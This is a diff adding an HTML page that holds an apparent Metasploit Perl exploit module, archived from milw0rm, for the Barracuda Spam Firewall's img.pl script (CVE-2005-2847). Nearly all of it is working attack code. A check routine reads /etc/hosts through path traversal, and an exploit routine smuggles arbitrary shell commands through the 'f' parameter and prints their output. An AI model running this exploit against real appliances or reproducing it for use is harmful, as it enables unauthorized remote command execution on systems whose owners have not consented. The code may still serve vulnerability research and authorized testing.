@@ -1,0 +1,189 @@
+<html><head><title>Barracuda Spam Firewall < 3.1.18 Command Execution Exploit (meta)</title></head><pre>##
+# This file is part of the Metasploit Framework and may be redistributed
+# according to the licenses defined in the Authors field below. In the
+# case of an unknown or missing license, this file defaults to the same
+# license as the core Framework (dual GPLv2 and Artistic). The latest
+# version of the Framework can always be obtained from metasploit.com.
+##
+
+package Msf::Exploit::barracuda_img_exec;
+use base &quot;Msf::Exploit&quot;;
+use strict;
+use Pex::Text;
+use bytes;
+
+my $advanced = { };
+
+my $info = {
+	'Name'     =&gt; 'Barracuda IMG.PL Remote Command Execution',
+	'Version'  =&gt; '$Revision: 1.0 $',
+	'Authors'  =&gt; [ 'Nicolas Gregoire &lt;ngregoire@exaprobe.com&gt;' ],
+	'Arch'     =&gt; [ 'x86' ],
+	'OS'       =&gt; [ 'linux' ],
+	'Priv'     =&gt; 0,
+	'UserOpts' =&gt;
+	  {
+		'RHOST' =&gt; [1, 'ADDR', 'The target address'],
+		'RPORT' =&gt; [1, 'PORT', 'The target port', 8000],
+		'VHOST' =&gt; [0, 'DATA', 'The virtual host name of the server'],
+		'IMG'   =&gt; [1, 'DATA', 'Full path of img.pl script', '/cgi-bin/img.pl'],
+		'SSL'   =&gt; [0, 'BOOL', 'Use SSL'],
+	  },
+
+	'Description' =&gt; Pex::Text::Freeform(qq{
+		This module exploits an arbitrary command execution vulnerability in the
+		Barracuda Spam Firewall appliance. Versions prior to  3.1.18 are vulnerable.
+}),
+
+	'Refs' =&gt;
+	  [
+		['URL', 'http://www.securiweb.net/wiki/Ressources/AvisDeSecurite/2005.1'],
+		['CVE', '2005-2847'],
+		['OSVDB', '19279'],
+		['BID', '14712'],
+		['NSS', '19556'],
+	  ],
+
+	'Payload' =&gt;
+	  {
+		'Space' =&gt; 512,
+		'Keys'  =&gt; ['cmd'],
+	  },
+
+	'Keys' =&gt; ['barracuda'],
+  };
+
+sub new {
+	my $class = shift;
+	my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);
+	return($self);
+}
+
+sub Check {
+	my $self = shift;
+	my $target_host    = $self-&gt;GetVar('RHOST');
+	my $vhost          = $self-&gt;VHost;
+	my $target_port    = $self-&gt;GetVar('RPORT');
+	my $img            = $self-&gt;GetVar('IMG');
+
+	my $request =
+	  &quot;GET $img?f=%2e%2e/etc/hosts HTTP/1.1\r\n&quot;.
+	  &quot;Accept: */*\r\n&quot;.
+	  &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n&quot;.
+	  &quot;Host: $vhost:$target_port\r\n&quot;.
+	  &quot;Connection: Close\r\n&quot;.
+	  &quot;\r\n&quot;;
+
+	my $s = Msf::Socket::Tcp-&gt;new(
+		'PeerAddr' =&gt; $target_host,
+		'PeerPort' =&gt; $target_port,
+		'SSL'      =&gt; $self-&gt;GetVar('SSL'),
+	  );
+
+	if ($s-&gt;IsError){
+		$self-&gt;PrintLine('[*] Error creating socket: ' . $s-&gt;GetError);
+		return $self-&gt;CheckCode('Connect');
+	}
+
+	$self-&gt;PrintLine(&quot;[*] Establishing a connection to the target...&quot;);
+
+	$s-&gt;Send($request);
+	my $results = $s-&gt;Recv(-1, 20);
+	$s-&gt;Close();
+	
+	if (($results =~ /HTTP\/1\..\s+200/) &amp;&amp; ($results =~/127\.0\.0\.1/)) {
+
+		$self-&gt;PrintLine(&quot;[*] Vulnerable server detected!&quot;);
+		return $self-&gt;CheckCode('Confirmed');
+		
+	} elsif ($results =~ /HTTP\/1\..\s+([345]\d+)/) {
+
+		$self-&gt;PrintLine(&quot;[*] The Barraccuda application was not found.&quot;);
+		return $self-&gt;CheckCode('Safe');
+	}
+
+	$self-&gt;PrintLine(&quot;[*] Generic error...&quot;);
+	return $self-&gt;CheckCode('Generic');
+}
+
+sub Exploit {
+	my $self = shift;
+	my $target_host    = $self-&gt;GetVar('RHOST');
+	my $vhost          = $self-&gt;VHost;
+	my $target_port    = $self-&gt;GetVar('RPORT');
+	my $img            = $self-&gt;GetVar('IMG');
+	my $encodedPayload = $self-&gt;GetVar('EncodedPayload');
+	my $cmd            = $encodedPayload-&gt;RawPayload;
+
+	$img = $img.&quot;?f=&quot;.$self-&gt;URLEncode(qq#../bin/sh -c &quot;echo 'YYY';#. $cmd .qq#;echo 'YYY'&quot;|#);
+
+	my $request =
+	  &quot;GET $img HTTP/1.1\r\n&quot;.
+	  &quot;Accept: */*\r\n&quot;.
+	  &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n&quot;.
+	  &quot;Host: $vhost:$target_port\r\n&quot;.
+	  &quot;Connection: Close\r\n&quot;.
+	  &quot;\r\n&quot;;
+
+	my $s = Msf::Socket::Tcp-&gt;new(
+		'PeerAddr' =&gt; $target_host,
+		'PeerPort' =&gt; $target_port,
+		'SSL'      =&gt; $self-&gt;GetVar('SSL'),
+	  );
+
+	if ($s-&gt;IsError){
+		$self-&gt;PrintLine('[*] Error creating socket: ' . $s-&gt;GetError);
+		return;
+	}
+
+	$self-&gt;PrintLine(&quot;[*] Establishing a connection to the target...&quot;);
+	$s-&gt;Send($request);
+	my $results = $s-&gt;Recv(-1, 20);
+	
+	if ($results =~ /HTTP\/1\.. 200 OK/im) {
+
+		(undef, $results) = split(/YYY/, $results);
+		
+		$self-&gt;PrintLine(' ');
+		$self-&gt;PrintLine(&quot;$results&quot;);
+		$self-&gt;PrintLine(' ');
+
+		$self-&gt;PrintLine(&quot;[*] End of data.&quot;);
+
+	} else {
+		$self-&gt;PrintLine(' ');
+		$self-&gt;PrintLine(&quot;Doh ! Are you sure this server is vulnerable ?&quot;);
+	}
+
+	$s-&gt;Close();
+	return;
+}
+
+sub URLEncode {
+	my $self = shift;
+	my $data = shift;
+	my $res;
+
+	foreach my $c (unpack('C*', $data)) {
+		if (
+			($c &gt;= 0x30 &amp;&amp; $c &lt;= 0x39) ||
+			($c &gt;= 0x41 &amp;&amp; $c &lt;= 0x5A) ||
+			($c &gt;= 0x61 &amp;&amp; $c &lt;= 0x7A)
+		  ) {
+			$res .= chr($c);
+		} else {
+			$res .= sprintf(&quot;%%%.2x&quot;, $c);
+		}
+	}
+	return $res;
+}
+
+sub VHost {
+	my $self = shift;
+	my $name = $self-&gt;GetVar('VHOST') || $self-&gt;GetVar('RHOST');
+	return $name;
+}
+
+1;
+
+# milw0rm.com [2005-09-27]</pre></html>
